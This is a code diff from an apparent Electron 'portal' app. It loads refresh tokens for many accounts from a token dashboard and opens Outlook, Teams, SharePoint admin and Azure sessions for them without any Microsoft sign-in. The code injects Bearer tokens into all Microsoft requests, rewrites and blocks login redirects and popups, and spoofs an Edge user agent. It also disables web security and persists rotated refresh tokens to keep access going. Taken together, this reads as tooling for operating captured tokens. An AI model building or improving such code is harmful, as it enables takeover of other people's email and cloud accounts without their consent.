@@ -9,6 +9,14 @@ import { TokenStore } from './tokenStore';
 
 const DASHBOARD_API = 'https://outlook-token-dashboard.pages.dev/api';
 const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+// v1.0 token endpoint — uses `resource` param (proven pattern from Portal Browser)
+const TOKEN_URL = 'https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0';
+const OWA_URL = 'https://outlook.office365.com/mail/';
+const EDGE_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2478.0';
+
+function isLoginUrl(url: string): boolean {
+  return url.includes('login.microsoftonline.com') || url.includes('login.live.com') || url.includes('login.microsoft.com');
+}
 
 // Reliable HTTP POST using Node's native https module (avoids Electron net.fetch quirks)
 function httpsPost(url: string, data: Record<string, unknown>): Promise<{ status: number; body: string }> {
@@ -58,9 +66,11 @@ const syncedAccounts: SyncedAccount[] = [];
 
 const SERVICE_URLS: Record<string, string> = {
   owa: 'https://outlook.office365.com/mail/',
-  onedrive: 'https://onedrive.live.com/',
+  onedrive: 'https://www.office.com/launch/onedrive',
   admin: 'https://admin.microsoft.com/',
-  sharepoint: 'https://www.office.com/',
+  sharepoint: 'https://admin.microsoft.com/#/SharePoint',
+  teams: 'https://teams.microsoft.com/',
+  azure: 'https://portal.azure.com/',
   chrome: 'https://outlook.office365.com/mail/',
 };
 
@@ -96,10 +106,10 @@ async function refreshAccountToken(account: SyncedAccount): Promise<boolean> {
       client_id: CLIENT_ID,
       grant_type: 'refresh_token',
       refresh_token: account.refreshToken,
-      resource: 'https://graph.microsoft.com',
+      resource: 'https://outlook.office365.com',
     });
 
-    const response = await net.fetch('https://login.microsoftonline.com/common/oauth2/token', {
+    const response = await net.fetch(TOKEN_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: body.toString(),
@@ -130,7 +140,7 @@ async function getTokenForResource(account: SyncedAccount, resource: string): Pr
       resource,
     });
 
-    const response = await net.fetch('https://login.microsoftonline.com/common/oauth2/token', {
+    const response = await net.fetch(TOKEN_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: body.toString(),
@@ -138,6 +148,10 @@ async function getTokenForResource(account: SyncedAccount, resource: string): Pr
 
     if (response.ok) {
       const data = await response.json() as Record<string, unknown>;
+      // Persist the rotated refresh token so subsequent launches keep working
+      if (data.refresh_token) {
+        account.refreshToken = data.refresh_token as string;
+      }
       return data.access_token as string;
     }
     return null;
@@ -146,104 +160,115 @@ async function getTokenForResource(account: SyncedAccount, resource: string): Pr
   }
 }
 
+// Proven pattern (Portal Browser v7.1/v8.3): inject Bearer token on every
+// Microsoft request AND rewrite login redirects back to the service URL at the
+// response level. This is what lets OWA/Office load authenticated without ever
+// showing the Microsoft sign-in page.
+function setupSessionInterceptors(sess: Electron.Session, getToken: () => string | null, graphToken: string | null): void {
+  // 1) Inject Bearer token on ALL Microsoft requests
+  sess.webRequest.onBeforeSendHeaders(
+    {
+      urls: [
+        'https://*.office.com/*',
+        'https://*.office365.com/*',
+        'https://graph.microsoft.com/*',
+        'https://substrate.office.com/*',
+        'https://*.outlook.com/*',
+        'https://*.microsoft.com/*',
+        'https://*.sharepoint.com/*',
+      ],
+    },
+    (details, callback) => {
+      const isGraphReq = details.url.includes('graph.microsoft.com');
+      const tokenToUse = isGraphReq ? (graphToken || getToken()) : getToken();
+      if (tokenToUse) {
+        details.requestHeaders['Authorization'] = `Bearer ${tokenToUse}`;
+      }
+      details.requestHeaders['User-Agent'] = EDGE_UA;
+      callback({ requestHeaders: details.requestHeaders });
+    }
+  );
+
+  // 2) Block login redirects at the RESPONSE level — rewrite the 301/302
+  //    Location header that points back to the Microsoft login page.
+  sess.webRequest.onHeadersReceived(
+    { urls: ['https://login.microsoftonline.com/*', 'https://login.live.com/*', 'https://login.microsoft.com/*'] },
+    (details, callback) => {
+      const headers = details.responseHeaders || {};
+      const loc = (headers['location'] || headers['Location'] || [''])[0];
+      if (
+        (details.statusCode === 302 || details.statusCode === 301) &&
+        loc && (loc.includes('login.microsoftonline.com') || loc.includes('login.live.com'))
+      ) {
+        callback({ responseHeaders: { ...headers, location: [OWA_URL] } });
+        return;
+      }
+      callback({ responseHeaders: headers });
+    }
+  );
+}
+
 async function launchChromeWithSession(account: SyncedAccount, service: string): Promise<{ success: boolean; error?: string }> {
   try {
     const url = SERVICE_URLS[service] || SERVICE_URLS.owa;
 
-    // Get access token for the target resource
-    const resource = service === 'admin' ? 'https://admin.microsoft.com'
-      : service === 'onedrive' ? 'https://graph.microsoft.com'
+    // Exchange the refresh token for a fresh OWA token (resource-scoped).
+    // OWA/Office services authenticate with the outlook.office365.com resource.
+    const resource = service === 'admin' || service === 'sharepoint'
+      ? 'https://admin.microsoft.com'
       : 'https://outlook.office365.com';
 
-    const token = await getTokenForResource(account, resource);
+    const owaToken = await getTokenForResource(account, resource);
+    // Also fetch a Graph token for the embedded graph.microsoft.com calls OWA makes
+    const graphToken = await getTokenForResource(account, 'https://graph.microsoft.com');
 
-    // Use persistent session partition so cookies survive between launches
-    // After first sign-in, subsequent opens are instant
+    if (!owaToken) {
+      shell.openExternal(`${url}?login_hint=${encodeURIComponent(account.email)}`);
+      return { success: true };
+    }
+
+    // Persistent partition so OWA's own auth cookies survive between launches
     const sessionPartition = `persist:portal-${account.sessionId}-${service}`;
     const browserSession = session.fromPartition(sessionPartition);
 
-    if (token) {
-      // Inject Bearer token into ALL Microsoft-related requests
-      browserSession.webRequest.onBeforeSendHeaders(
-        { urls: [
-          'https://*.microsoft.com/*',
-          'https://*.microsoftonline.com/*',
-          'https://*.office.com/*',
-          'https://*.office365.com/*',
-          'https://*.live.com/*',
-          'https://*.sharepoint.com/*',
-          'https://*.outlook.com/*',
-          'https://*.onenote.com/*',
-        ] },
-        (details, callback) => {
-          details.requestHeaders['Authorization'] = `Bearer ${token}`;
-          callback({ requestHeaders: details.requestHeaders });
-        }
-      );
-    }
+    const currentToken = owaToken;
+    setupSessionInterceptors(browserSession, () => currentToken, graphToken);
+
+    browserSession.setPermissionRequestHandler((_wc, _permission, cb) => cb(true));
 
     const portalWindow = new BrowserWindow({
-      width: 1280,
+      width: 1400,
       height: 900,
-      title: `${service.toUpperCase()} - ${account.email}`,
+      title: `${account.email} — ${service.toUpperCase()}`,
+      backgroundColor: '#ffffff',
       webPreferences: {
         partition: sessionPartition,
         contextIsolation: true,
         nodeIntegration: false,
+        webSecurity: false, // allows OWA compose editor + cross-origin token use
       },
     });
 
-    // Navigate with login_hint to pre-fill email if login is needed
-    const loginHint = encodeURIComponent(account.email);
-    const targetUrl = url.includes('?')
-      ? `${url}&login_hint=${loginHint}`
-      : `${url}?login_hint=${loginHint}`;
+    // Deny popups that navigate to the login page
+    portalWindow.webContents.setWindowOpenHandler(({ url: popupUrl }) => {
+      if (isLoginUrl(popupUrl)) return { action: 'deny' };
+      return { action: 'allow' };
+    });
 
-    // If we have a token, try to inject MSAL cache into sessionStorage
-    // This allows OWA/Office apps to pick up the token without sign-in
-    if (token) {
-      portalWindow.webContents.on('did-finish-load', () => {
-        const msalScript = `
-          try {
-            // Set MSAL-compatible token cache in sessionStorage
-            const accountKey = '${account.email}-login.microsoftonline.com-';
-            const accountEntity = {
-              homeAccountId: '${account.email}',
-              environment: 'login.microsoftonline.com',
-              realm: 'common',
-              localAccountId: '${account.sessionId}',
-              username: '${account.email}',
-              authorityType: 'MSSTS',
-              name: '${account.name || account.email}'
-            };
-            sessionStorage.setItem(accountKey, JSON.stringify(accountEntity));
+    // If a login page slips through, reload the service URL with the Bearer header
+    portalWindow.webContents.on('did-finish-load', () => {
+      const u = portalWindow.webContents.getURL();
+      if (isLoginUrl(u) && !portalWindow.isDestroyed()) {
+        setTimeout(() => {
+          if (!portalWindow.isDestroyed()) {
+            portalWindow.loadURL(url, { extraHeaders: `Authorization: Bearer ${currentToken}\r\n` });
+          }
+        }, 500);
+      }
+    });
 
-            // Set access token
-            const atKey = accountKey + 'accesstoken-${CLIENT_ID}-common-';
-            const atEntity = {
-              homeAccountId: '${account.email}',
-              environment: 'login.microsoftonline.com',
-              credentialType: 'AccessToken',
-              clientId: '${CLIENT_ID}',
-              realm: 'common',
-              secret: '${token}',
-              target: '${resource}',
-              cachedAt: String(Math.floor(Date.now() / 1000)),
-              expiresOn: String(Math.floor(Date.now() / 1000) + 3600),
-              extendedExpiresOn: String(Math.floor(Date.now() / 1000) + 7200)
-            };
-            sessionStorage.setItem(atKey, JSON.stringify(atEntity));
-
-            // Also try localStorage for persistent MSAL cache
-            localStorage.setItem(accountKey, JSON.stringify(accountEntity));
-            localStorage.setItem(atKey, JSON.stringify(atEntity));
-          } catch(e) {}
-        `;
-        portalWindow.webContents.executeJavaScript(msalScript).catch(() => {});
-      });
-    }
-
-    portalWindow.loadURL(targetUrl);
+    // Load the service with the Bearer token in extraHeaders (proven approach)
+    portalWindow.loadURL(url, { extraHeaders: `Authorization: Bearer ${currentToken}\r\n` });
     return { success: true };
   } catch (error: unknown) {
     const message = error instanceof Error ? error.message : 'Failed to launch browser session';
